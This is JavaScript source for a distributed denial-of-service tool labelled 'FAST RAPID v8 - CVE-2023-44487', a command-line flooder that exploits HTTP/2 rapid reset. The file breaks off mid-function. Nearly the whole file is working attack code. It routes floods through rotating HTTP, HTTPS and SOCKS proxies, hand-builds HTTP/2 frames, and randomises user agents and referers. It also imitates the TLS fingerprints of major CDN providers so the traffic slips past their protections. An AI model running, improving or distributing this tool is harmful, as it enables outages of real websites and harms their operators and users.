const { Command } = require('commander');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');
const fs = require('fs');
const http = require('http');
const dns = require('dns');

process.on(`uncaughtException`, (e) => { });
process.on(`unhandledRejection`, (e) => { });

const prog = new Command();
prog
    .option('-u, --target <url>', 'Target URL')
    .option('-n, --connections <number>', 'Number of connections', parseInt)
    .option('-s, --time <seconds>', 'Time to run', parseInt)
    .option('-t, --threads <number>', 'Number of threads', parseInt)
    .option('-m, --streams <number>', 'Number of streams', parseInt)
    .option('-p, --proxy <proxy>', 'Proxy configuration')
    .option('-i, --postdata <data>', 'Post data')
    .option('-h, --headerdata <header...>', 'Header data')
    .option('-r, --rate <rate>', 'Rate')
    .option('-c, --cookie <cookie>', 'Cookie')
    .option('-e, --methods <method>', 'HTTP method: GET, POST, HEAD, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, RAND', 'GET')
    .option('--cache <true/false>', 'Disable cache header', false)
    .option('--ratelimit <true/false>', 'Ratelimit mode', false)
    .option('--fingerprint <true/false>', 'TLS fingerprint', false)
    .option('--set-cookie <true/false>', 'Enable cookie session handling', false)
    .option('--delay <number>', 'Delay between requests in seconds', parseInt)
    .option('--randrate <true/false>', 'Use random rate between 16-90', false)
    .option('--referer <url>', 'Referer URL (use "rand" for random referer)')
    .option('--http <version>', 'HTTP version: 1 for HTTP/1.1, 2 for HTTP/2')
    .option('--redirect <true/false>', 'Follow redirect URLs', false)
    .option('--extra <true/false>', 'Enable extra headers', false)
    .option('--reset <true/false>', 'Rapid reset exploit', false)
    .parse(process.argv);

const opts = prog.opts();

// Validasi dan parsing opsi boolean
function parseBoolean(value) {
    if (typeof value === 'boolean') return value;
    if (typeof value === 'string') {
        return value.toLowerCase() === 'true';
    }
    return false;
}

// Parse semua opsi boolean
const cache_opt = parseBoolean(opts.cache);
const ratelimit_opt = parseBoolean(opts.ratelimit);
const fingerprint_opt = parseBoolean(opts.fingerprint);
const cookiesession_opt = parseBoolean(opts.setCookie);
const randrate_opt = parseBoolean(opts.randrate);
const redirect_opt = parseBoolean(opts.redirect);
const extra_opt = parseBoolean(opts.extra);
const reset_opt = parseBoolean(opts.reset);

const delay_opt = Math.min(opts.delay || 0, 5);
const methods_opt = opts.methods || 'GET';
const http_opt = opts.http;

if (!opts.target || !opts.time || !opts.threads || !opts.rate || !opts.proxy) {
    console.log(`
  FAST RAPID v8 - CVE-2023-44487 - Last updated 21-11-2025
  MODIFIED: Full proxy format support (http://, https://, socks4://, socks5://, ip:port)

Usage:
  node FastRapid --target <url> --time <time> --threads <threads> --rate <rate> --proxy <proxyfile>

Required:
  -u, --target    Target URL (https://example.com)
  -s, --time      Attack duration in seconds
  -t, --threads   Number of threads
  -r, --rate      Request rate
  -p, --proxy     Proxy file path

Options:
  -n, --connections   Connections per thread (default: 1)
  -m, --streams       Streams per connection (default: 1)
  -i, --postdata      POST data
  -h, --headerdata    Custom headers (format: header@value)
  -c, --cookie        Cookie string
  -e, --methods       HTTP method: GET/POST/... (default: GET)
  --cache             <true/false> Disable cache header (default: false)
  --ratelimit         <true/false> Ratelimit mode (default: false)
  --fingerprint       <true/false> TLS fingerprint (default: false)
  --set-cookie        <true/false> Enable cookie session handling (default: false)
  --delay             <number> Delay between requests in seconds (max: 5)
  --randrate          <true/false> Use random rate between 16-90 (default: false)
  --referer           <url> Referer URL (use "rand" for random referer)
  --http              <version> HTTP version: 1 for HTTP/1.1, 2 for HTTP/2
  --redirect          <true/false> Follow redirect URLs (default: false)
  --extra             <true/false> Enable extra headers (default: false)
  --reset             <true/false> Rapid reset exploit

Proxy file format supported:
  http://ip:port
  https://ip:port
  socks4://ip:port
  socks5://ip:port
  ip:port (auto detected as HTTP)
    `);
    process.exit(1);
}

const trg = opts.target;
const time = opts.time;
const threads = opts.threads;
const rate = opts.rate || 1;
const connections = opts.connections || 1;
const streams = opts.streams || 1;
const referer_opt = opts.referer;
const pFile = opts.proxy;

// Validasi file proxy
if (!fs.existsSync(pFile)) {
    console.log(`Error: Proxy file '${pFile}' not found`);
    process.exit(1);
}

// ==================== PROXY PARSER (SUPPORT ALL FORMATS) ====================
function parseProxyLine(line) {
    line = line.trim();
    if (!line) return null;

    let protocol = 'http'; // default protocol
    let rest = line;

    // Check for protocol prefix
    const protocolMatch = line.match(/^(https?|socks[45]):\/\/(.+)$/i);
    if (protocolMatch) {
        protocol = protocolMatch[1].toLowerCase();
        rest = protocolMatch[2];
    }

    // Extract IP and Port
    const ipPortMatch = rest.match(/^([^:]+):(\d+)$/);
    if (!ipPortMatch) return null;

    const ip = ipPortMatch[1];
    const port = parseInt(ipPortMatch[2]);

    if (!ip || isNaN(port) || port <= 0 || port > 65535) return null;

    return { protocol, ip, port };
}

// Read and parse proxies
const rawProxies = fs.readFileSync(pFile, 'utf8').replace(/\r/g, '').split('\n').filter(p => p.trim());
const proxyList = [];

for (const line of rawProxies) {
    const proxy = parseProxyLine(line);
    if (proxy) {
        proxyList.push(proxy);
    } else {
        console.log(`[WARN] Skipping invalid proxy: ${line}`);
    }
}

if (proxyList.length === 0) {
    console.log(`Error: No valid proxies found in '${pFile}'`);
    console.log(`Supported formats: http://ip:port, https://ip:port, socks4://ip:port, socks5://ip:port, ip:port`);
    process.exit(1);
}

console.log(`[INFO] Loaded ${proxyList.length} proxies from ${pFile}`);

// Handle URL berdasarkan http_opt
let trgUrl;
try {
    if (http_opt === '1') {
        trgUrl = new URL(trg.replace(/^https:/, 'http:'));
    } else if (http_opt === '2') {
        trgUrl = new URL(trg.replace(/^http:/, 'https:'));
    } else {
        trgUrl = new URL(trg);
    }
} catch (e) {
    console.log(`Error: Invalid target URL '${trg}'`);
    process.exit(1);
}

const mainStat = [];
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
let statCounts = {};
let pIdx = 0;
let roundRobinIndex = 0;
let globalISPInfo = null;

// Redirect system variables
let currentTargetUrl = trgUrl;
let redirectCount = 0;
const MAX_REDIRECTS = 10;

const cookieStore = new Map();
const sessionStore = new Map();

let proxyStats = proxyList.map((proxy, idx) => ({
    p: `${proxy.protocol}://${proxy.ip}:${proxy.port}`,
    protocol: proxy.protocol,
    ip: proxy.ip,
    port: proxy.port,
    failCount: 0,
    successCount: 0,
    priority: 0,
    cookies: new Map()
}));

const SECURE_OPTIONS =
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_NO_TICKET |
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_TLSEXT_PADDING |
    crypto.constants.SSL_OP_ALL;

// Available HTTP methods
const HTTP_METHODS = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH'];

function get_http_method() {
    if (methods_opt === 'RAND') {
        return HTTP_METHODS[Math.floor(Math.random() * HTTP_METHODS.length)];
    }
    return methods_opt;
}

function getALPNProtocols() {
    return http_opt === '1' ? ['http/1.1'] :
        http_opt === '2' ? ['h2'] :
            ['h2', 'http/1.1'];
}

const ciphers = [
    'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_GCM_SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256',
    'DHE-RSA-AES256-GCM-SHA384', 'DHE-RSA-AES128-GCM-SHA256',
    'AES256-GCM-SHA384', 'AES128-GCM-SHA256'
];

const sigalgs = ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp384r1_sha384'];
const curves = ['X25519', 'secp256r1', 'secp384r1'];

const TLS_CIPHERS = {
    TLS13: ['TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_GCM_SHA256'],
    ECDHE: [
        'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
        'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256'
    ],
    DHE: ['DHE-RSA-AES256-GCM-SHA384', 'DHE-RSA-AES128-GCM-SHA256'],
    LEGACY: ['AES256-GCM-SHA384', 'AES128-GCM-SHA256']
};

const randomReferers = [
    'https://www.google.com/', 'https://www.facebook.com/', 'https://www.youtube.com/',
    'https://www.amazon.com/', 'https://www.reddit.com/', 'https://www.twitter.com/',
    'https://www.instagram.com/', 'https://www.linkedin.com/', 'https://www.github.com/',
    'https://www.stackoverflow.com/', 'https://www.wikipedia.org/', 'https://www.bing.com/'
];

function get_random_referer() {
    return randomReferers[Math.floor(Math.random() * randomReferers.length)];
}

function get_referer() {
    if (referer_opt === 'rand') {
        return get_random_referer();
    } else if (referer_opt) {
        return referer_opt;
    }
    return null;
}

function handle_redirect(headers) {
    if (!redirect_opt) return false;

    const locationHeader = headers.find(x => x[0] == 'location');
    if (locationHeader && locationHeader[1]) {
        try {
            const newUrl = new URL(locationHeader[1], currentTargetUrl);
            if (!newUrl.hostname || !newUrl.protocol) return false;
            currentTargetUrl = newUrl;
            redirectCount++;
            return true;
        } catch (e) { return false; }
    }
    return false;
}

function shuffle_tls_settings() {
    const shuffled_ciphers = [...ciphers].sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * (ciphers.length - 5 + 1)) + 5);
    const shuffled_sigalgs = [...sigalgs].sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * (sigalgs.length - 2 + 1)) + 2);
    const shuffled_curves = [...curves].sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * (curves.length - 1 + 1)) + 1);
    return { shuffled_ciphers, shuffled_sigalgs, shuffled_curves };
}

function parse_set_cookie(header, domain) {
    if (!header) return null;
    try {
        const cookieStr = header.split(';')[0].trim();
        const [name, value] = cookieStr.split('=');
        if (name && value) {
            if (!cookieStore.has(domain)) cookieStore.set(domain, new Map());
            cookieStore.get(domain).set(name, value);
            return { name, value };
        }
    } catch (e) { }
    return null;
}

function get_cookies_for_domain(domain) {
    if (!cookieStore.has(domain)) return '';
    const cookies = cookieStore.get(domain);
    return Array.from(cookies.entries()).map(([name, value]) => `${name}=${value}`).join('; ');
}

function get_current_rate() {
    if (randrate_opt) return random_int(16, 90);
    return rate;
}

function random_int(minimum, maximum) {
    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
}

const ispProfiles = {
    google: {
        name: 'Google', match: ['google', 'google llc', 'google cloud', 'gstatic', 'youtube'],
        tls: {
            minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
            ciphers: [...TLS_CIPHERS.TLS13, ...TLS_CIPHERS.ECDHE, 'AES256-GCM-SHA384', 'AES128-GCM-SHA256'].join(':'),
            ALPNProtocols: getALPNProtocols(), honorCipherOrder: false, secureOptions: SECURE_OPTIONS
        },
        settings: [[1, 65536], [2, 0], [3, 1000], [4, 16777215], [5, 16384], [6, 262144]]
    },
    cloudflare: {
        name: 'Cloudflare', match: ['cloudflare', 'cloudflare inc'],
        tls: {
            minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
            ciphers: [...TLS_CIPHERS.TLS13, 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305'].join(':'),
            ALPNProtocols: getALPNProtocols(), honorCipherOrder: false, secureOptions: SECURE_OPTIONS | crypto.constants.SSL_OP_NO_TICKET
        },
        settings: [[1, 65536], [2, 0], [3, 100], [4, 65535], [5, 16384], [6, 65536]]
    },
    akamai: {
        name: 'Akamai', match: ['akamai', 'akamai technologies'],
        tls: {
            minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
            ciphers: [...TLS_CIPHERS.TLS13, ...TLS_CIPHERS.ECDHE, ...TLS_CIPHERS.DHE, 'AES256-GCM-SHA384', 'AES128-GCM-SHA256'].join(':'),
            ALPNProtocols: getALPNProtocols(), honorCipherOrder: false, secureOptions: SECURE_OPTIONS
        },
        settings: [[1, 32768], [2, 1], [3, 128], [4, 131072], [5, 32768], [6, 65536]]
    },
    amazon: {
        name: 'Amazon', match: ['amazon', 'amazon.com', 'amazon technologies', 'aws'],
        tls: {
            minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
            ciphers: [...TLS_CIPHERS.TLS13, 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES128-SHA256', 'ECDHE-RSA-AES128-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384', 'AES128-GCM-SHA256', 'AES256-GCM-SHA384'].join(':'),
            ALPNProtocols: getALPNProtocols(), honorCipherOrder: false, secureOptions: SECURE_OPTIONS
        },
        settings: [[1, 8192], [2, 1], [3, 128], [4, 65535], [5, 16384], [6, 16384]]
    },
    microsoft: {
        name: 'Microsoft', match: ['microsoft', 'microsoft corporation', 'azure'],
        tls: {
            minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
            ciphers: [...TLS_CIPHERS.TLS13, 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'DHE-RSA-AES256-GCM-SHA384', 'DHE-RSA-AES128-GCM-SHA256'].join(':'),
            ALPNProtocols: getALPNProtocols(), honorCipherOrder: false, secureOptions: SECURE_OPTIONS
        },
        settings: [[1, 16384], [2, 0], [3, 100], [4, 65535], [5, 16384], [6, 32768]]
    },
    default: {
        name: 'Default', match: [],
        tls: {
            minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
            ciphers: [...TLS_CIPHERS.TLS13, ...TLS_CIPHERS.ECDHE, ...TLS_CIPHERS.DHE, ...TLS_CIPHERS.LEGACY, '!aNULL', '!eNULL', '!EXPORT', '!DES', '!RC4', '!3DES', '!MD5', '!PSK'].join(':'),
            ALPNProtocols: getALPNProtocols(), honorCipherOrder: false, secureOptions: SECURE_OPTIONS
        },
        settings: [[1, 4096], [2, 0], [3, 100], [4, 65535], [5, 16384], [6, 65536]]
    }
};

const detectTargetProfile = (targetUrl) => {
    const hostname = targetUrl.hostname.toLowerCase();
    if (hostname.includes('google') || hostname.includes('gstatic') || hostname.includes('youtube')) return 'google';
    if (hostname.includes('cloudflare') || hostname.endsWith('.pages.dev')) return 'cloudflare';
    if (hostname.includes('amazon') || hostname.includes('aws')) return 'amazon';
    if (hostname.includes('akamai')) return 'akamai';
    if (hostname.includes('microsoft') || hostname.includes('azure')) return 'microsoft';
    return 'default';
};

const detectTargetISP = async (targetUrl) => {
    return new Promise((resolve) => {
        dns.lookup(targetUrl.hostname, (err, targetIP, family) => {
            if (err) { resolve(null); return; }
            const ispOptions = {
                hostname: 'ip-api.com', port: 80,
                path: `/json/${targetIP}?fields=status,message,isp,org,country,countryCode`,
                method: 'GET', timeout: 10000
            };
            const ispReq = http.request(ispOptions, (ispRes) => {
                let ispData = '';
                ispRes.on('data', (chunk) => ispData += chunk);
                ispRes.on('end', () => {
                    try {
                        const ispInfo = JSON.parse(ispData);
                        if (ispInfo.status === 'success') {
                            globalISPInfo = ispInfo;
                            resolve(ispInfo);
                        } else resolve(null);
                    } catch (e) { resolve(null); }
                });
            });
            ispReq.on('error', () => resolve(null));
            ispReq.on('timeout', () => { ispReq.destroy(); resolve(null); });
            ispReq.end();
        });
    });
};

const detectTargetProfileFromURL = (targetUrl, ispInfo) => {
    const urlProfile = detectTargetProfile(targetUrl);
    if (urlProfile !== 'default') return ispProfiles[urlProfile];
    if (ispInfo && ispInfo.isp) {
        const ispLower = ispInfo.isp.toLowerCase();
        if (ispLower.includes('cloudflare')) return ispProfiles.cloudflare;
        if (ispLower.includes('google')) return ispProfiles.google;
        if (ispLower.includes('amazon') || ispLower.includes('aws')) return ispProfiles.amazon;
        if (ispLower.includes('akamai')) return ispProfiles.akamai;
        if (ispLower.includes('microsoft') || ispLower.includes('azure')) return ispProfiles.microsoft;
    }
    return ispProfiles.default;
};

const ssl_versions = ['771', '772', '773'];
const cipher_suites = ['4865', '4866', '4867', '49195', '49199', '49196', '49200', '52393', '52392', '49171', '49172', '156', '157', '47', '53'];
const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];
const elliptic_curves = ['4588', '29', '23', '24'];

const getConfiguration = async () => {
    const ispInfo = await detectTargetISP(currentTargetUrl);
    const profile = detectTargetProfileFromURL(currentTargetUrl, ispInfo);

    if (fingerprint_opt) {
        const { shuffled_ciphers, shuffled_sigalgs, shuffled_curves } = shuffle_tls_settings();
        return {
            ...profile, ispInfo: ispInfo,
            tls: {
                ...profile.tls,
                ciphers: shuffled_ciphers.join(':') + ':!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
                ...(Math.random() < 0.50 ? { sigalgs: shuffled_sigalgs.join(':') } : {}),
                ecdhCurve: shuffled_curves.join(':'),
                ALPNProtocols: getALPNProtocols()
            }
        };
    }
    return { ...profile, ispInfo: ispInfo };
};

const BufWin = (val) => {
    const buf = Buffer.alloc(4);
    buf.writeUInt32BE(val, 0);
    return buf;
};

function random_fingerprint() {
    const version = ssl_versions[random_int(0, ssl_versions.length - 1)];
    const cipher = cipher_suites[random_int(0, cipher_suites.length - 1)];
    const extension = extensions[random_int(0, extensions.length - 1)];
    const curve = elliptic_curves[random_int(0, elliptic_curves.length - 1)];
    const ja3 = `${version},${cipher},${extension},${curve}`;
    return crypto.createHash('md5').update(ja3).digest('hex');
}

const FrEnc = (streamId, type, payload = "", flags = 0) => {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame = Buffer.concat([frame, payload]);
    return frame;
};

const FrDec = (data) => {
    const lenType = data.readUInt32BE(0);
    const len = lenType >> 8;
    const type = lenType & 0xFF;
    let payload = "";
    if (len > 0) {
        payload = data.subarray(9, 9 + len);
        if (payload.length !== len) return null;
    }
    return { len, type, payload };
};

const Settings = (settings) => {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
};

// ==================== PROXY CONNECTION HANDLER (SUPPORT ALL PROTOCOLS) ====================
function Proxy() {
    const activeProxies = proxyStats.filter(proxy => proxy.priority !== -1);

    if (activeProxies.length === 0) {
        proxyStats.forEach(proxy => {
            if (proxy.failCount < 20) {
                proxy.priority = 0;
                proxy.failCount = 0;
            }
        });
        return Proxy();
    }

    if (proxyStats.every(proxy => proxy.priority !== 0)) {
        proxyStats.sort((a, b) => b.priority - a.priority);
    }

    const proxy = proxyStats[roundRobinIndex];
    roundRobinIndex = (roundRobinIndex + 1) % proxyStats.length;
    pIdx = proxyStats.findIndex(p => p === proxy);

    return proxy;
}

// ==================== PROTOCOL CONNECTORS ====================
function connectHTTP(proxy, targetHost, targetPort, onConnect, onFail) {
    const socket = net.connect(proxy.port, proxy.ip, () => {
        socket.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: keep-alive\r\n\r\n`);
    });

    socket.once('data', (data) => {
        if (data.toString().includes('200')) {
            onConnect(socket);
        } else {
            socket.destroy();
            onFail();
        }
    });
    socket.on('error', () => { socket.destroy(); onFail(); });
    socket.setTimeout(10000, () => { socket.destroy(); onFail(); });
}

function connectHTTPS(proxy, targetHost, targetPort, onConnect, onFail) {
    const tlsSocket = tls.connect({ host: proxy.ip, port: proxy.port, rejectUnauthorized: false }, () => {
        tlsSocket.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: keep-alive\r\n\r\n`);
        tlsSocket.once('data', (data) => {
            if (data.toString().includes('200')) {
                onConnect(tlsSocket);
            } else {
                tlsSocket.destroy();
                onFail();
            }
        });
    });
    tlsSocket.on('error', () => { onFail(); });
}

function connectSocks4(proxy, targetHost, targetPort, onConnect, onFail) {
    const socket = net.connect(proxy.port, proxy.ip, () => {
        const msg = Buffer.alloc(9);
        msg[0] = 0x04;
        msg[1] = 0x01;
        msg.writeUInt16BE(targetPort, 2);
        const ipParts = targetHost.split('.');
        if (ipParts.length === 4) {
            for (let i = 0; i < 4; i++) msg[4 + i] = parseInt(ipParts[i]);
        } else {
            msg[4] = msg[5] = msg[6] = 0; msg[7] = 1;
        }
        msg[8] = 0x00;
        socket.write(msg);
    });
    socket.once('data', (data) => {
        if (data[1] === 0x5A) {
            onConnect(socket);
        } else {
            socket.destroy();
            onFail();
        }
    });
    socket.on('error', () => { socket.destroy(); onFail(); });
}

function connectSocks5(proxy, targetHost, targetPort, onConnect, onFail) {
    const socket = net.connect(proxy.port, proxy.ip, () => {
        socket.write(Buffer.from([0x05, 0x01, 0x00]));
    });
    socket.once('data', (data) => {
        if (data[0] !== 0x05 || data[1] !== 0x00) {
            socket.destroy(); onFail(); return;
        }
        const hostBuf = Buffer.from(targetHost);
        const req = Buffer.alloc(7 + hostBuf.length);
        req[0] = 0x05; req[1] = 0x01; req[2] = 0x00; req[3] = 0x03; req[4] = hostBuf.length;
        hostBuf.copy(req, 5);
        req.writeUInt16BE(targetPort, 5 + hostBuf.length);
        socket.write(req);
        socket.once('data', (resp) => {
            if (resp[1] === 0x00) {
                onConnect(socket);
            } else {
                socket.destroy(); onFail();
            }
        });
    });
    socket.on('error', () => { socket.destroy(); onFail(); });
}

const connectHandlers = {
    'http': connectHTTP,
    'https': connectHTTPS,
    'socks4': connectSocks4,
    'socks5': connectSocks5
};

// Enhanced Flooder function dengan proxy connection handler
const Flooder = async (config) => {
    for (let connectionIndex = 0; connectionIndex < connections; connectionIndex++) {
        try {
            const proxy = Proxy();
            if (!proxy) continue;

            const targetPort = currentTargetUrl.port || (currentTargetUrl.protocol === 'https:' ? 443 : 80);

            const connectFn = connectHandlers[proxy.protocol];
            if (!connectFn) continue;

            connectFn(proxy, currentTargetUrl.hostname, targetPort, (socket) => {
                if (currentTargetUrl.protocol === 'https:') {
                    handleHTTPSConnection(socket, config, targetPort);
                } else {
                    handleHTTPConnection(socket, config, targetPort);
                }
            }, () => {
                proxyStats[pIdx].failCount++;
                setTimeout(() => Flooder(config), 1000);
            });

        } catch (error) {
            proxyStats[pIdx].failCount++;
        }
    }
};

function handleHTTPSConnection(socket, config, targetPort) {
    const tlsSocket = tls.connect({
        socket: socket,
        ALPNProtocols: config.tls.ALPNProtocols,
        servername: currentTargetUrl.hostname,
        minVersion: config.tls.minVersion,
        maxVersion: config.tls.maxVersion,
        ciphers: config.tls.ciphers,
        honorCipherOrder: config.tls.honorCipherOrder,
        secureOptions: config.tls.secureOptions,
        ...(fingerprint_opt === true ? { fingerprint: random_fingerprint() } : {}),
    }, () => {
        setupHTTP2Connection(tlsSocket, config, true);
    }).on('error', () => {
        tlsSocket.destroy();
    }).on('close', () => {
        proxyStats[pIdx].failCount++;
    });
}

function handleHTTPConnection(socket, config, targetPort) {
    setupHTTP2Connection(socket, config, false);
}

function setupHTTP2Connection(socket, config, isTLS) {
    let streamId = 1;
    let data = Buffer.alloc(0);
    let hpack = new HPACK();
    hpack.setTableSize(4096);

    const frames = [
        Buffer.from(PREFACE, 'binary'),
        FrEnc(0, 4, Settings(config.settings)),
        FrEnc(0, 8, BufWin(15663105))
    ];

    socket.write(Buffer.concat(frames));

    socket.on('data', (eventData) => {
        data = Buffer.concat([data, eventData]);
        while (data.length >= 9) {
            const frame = FrDec(data);
            if (frame != null) {
                data = data.subarray(frame.len + 9);

                if (frame.type == 4 && frame.flags == 0) {
                    socket.write(FrEnc(0, 4, "", 1));
                }

                if (frame.type == 0) {
                    let winSize = frame.len;
                    if (winSize < 60000) {
                        let incWin = 65536 - winSize;
                        winSize += incWin;
                        const updateWin = Buffer.alloc(4);
                        updateWin.writeUInt32BE(incWin, 0);
                        socket.write(FrEnc(0, 8, updateWin));
                    }
                }

                if (frame.type == 1) {
                    const headers = hpack.decode(frame.payload);
                    const statusHeader = headers.find(x => x[0] == ':status');
                    if (statusHeader) {
                        const status = statusHeader[1];
                        if (!statCounts[status]) statCounts[status] = 0;
                        statCounts[status]++;

                        if (redirect_opt && (status === '301' || status === '302' || status === '303' || status === '307' || status === '308')) {
                            if (redirectCount < MAX_REDIRECTS && handle_redirect(headers)) {
                                socket.end();
                                Flooder(config);
                                return;
                            }
                        }

                        if (status === '429' && ratelimit_opt) {
                            socket.emit('ratelimit', 10);
                        }

                        if (status === '403') {
                            proxyStats[pIdx].failCount++;
                        } else {
                            proxyStats[pIdx].successCount++;
                        }
                    }

                    if (cookiesession_opt) {
                        const setCookieHeader = headers.find(x => x[0] == 'set-cookie');
                        if (setCookieHeader) {
                            parse_set_cookie(setCookieHeader[1], currentTargetUrl.hostname);
                        }
                    }
                }

                if (frame.type == 7) {
                    proxyStats[pIdx].failCount++;
                    socket.end();
                }
            } else {
                break;
            }
        }
    });

    const sendRequests = () => {
        if (socket.destroyed) return;

        const currentRate = get_current_rate();
        const currentProxy = proxyStats[pIdx];

        if (currentProxy.failCount > 10) {
            currentProxy.priority = -1;
            socket.end();
            return;
        }

        for (let i = 0; i < streams; i++) {
            for (let j = 0; j < currentRate; j++) {
                const headers = generateHeaders();
                const encodedHeaders = hpack.encode(Object.entries(headers).filter(([key, value]) => value != null));
                const headersFrame = FrEnc(streamId, 1, Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), encodedHeaders]), 0x25);

                if ((headers[':method'] === 'POST' || headers[':method'] === 'PUT' || headers[':method'] === 'PATCH') && opts.postdata) {
                    const dataFrame = FrEnc(streamId, 0, Buffer.from(opts.postdata), 0x1);
                    socket.write(Buffer.concat([headersFrame, dataFrame]));
                } else {
                    socket.write(headersFrame);
                }

                socket.write(headersFrame);
                streamId += 2;
            }
        }
    };

    setTimeout(sendRequests, delay_opt * 1000);
}

const userAgents = {
    chrome_windows: () => {
        const versions = ['120.0.6099.199', '120.0.6099.210', '121.0.6167.85', '121.0.6167.139', '122.0.6261.39', '122.0.6261.57'];
        const v = versions[Math.floor(Math.random() * versions.length)];
        return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v} Safari/537.36`;
    },
    chrome_mac: () => {
        const versions = ['120.0.6099.199', '121.0.6167.85', '122.0.6261.39'];
        const v = versions[Math.floor(Math.random() * versions.length)];
        const macVersions = ['10_15_7', '11_7_10', '12_6_8', '13_5_1', '14_3_1'];
        const macVersion = macVersions[Math.floor(Math.random() * macVersions.length)];
        return `Mozilla/5.0 (Macintosh; Intel Mac OS X ${macVersion}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v} Safari/537.36`;
    },
    firefox_windows: () => {
        const versions = ['120.0', '121.0', '122.0'];
        const v = versions[Math.floor(Math.random() * versions.length)];
        return `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${v}) Gecko/20100101 Firefox/${v}`;
    }
};

const generateUserAgent = () => {
    const browsers = [
        userAgents.chrome_windows, userAgents.chrome_windows, userAgents.chrome_windows,
        userAgents.chrome_mac, userAgents.chrome_mac,
        userAgents.firefox_windows
    ];
    return browsers[Math.floor(Math.random() * browsers.length)]();
};

const generateHeaders = () => {
    const ua = generateUserAgent();
    const isChrome = ua.includes('Chrome') && !ua.includes('Edg');
    const isFirefox = ua.includes('Firefox');
    const isWindows = ua.includes('Windows');
    const method = get_http_method();
    const referer = get_referer();
    const cache_header = cache_opt ? "no-cache" : "max-age=0";

    const headers = {
        ':method': method,
        ':authority': currentTargetUrl.hostname,
        ':scheme': currentTargetUrl.protocol.replace(':', ''),
        ':path': currentTargetUrl.pathname + currentTargetUrl.search,
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'upgrade-insecure-requests': '1'
    };

    if (referer && Math.random() < 0.85) headers['referer'] = referer;

    if (extra_opt) {
        if (Math.random() < 0.36) headers['sec-purpose'] = 'prefetch;prerender';
        if (Math.random() < 0.36) headers['purpose'] = 'prefetch';
        if (Math.random() < 0.37) headers['dnt'] = '1';
    }

    if (isChrome) {
        headers['sec-ch-ua'] = `"Chromium";v="122", "Google Chrome";v="122", "Not=A?Brand";v="99"`;
        headers['sec-ch-ua-mobile'] = '?0';
        headers['sec-ch-ua-platform'] = isWindows ? '"Windows"' : '"macOS"';
    }

    if (isFirefox) headers['dnt'] = '1';

    if (opts.cookie) headers['cookie'] = opts.cookie;
    else if (cookiesession_opt) {
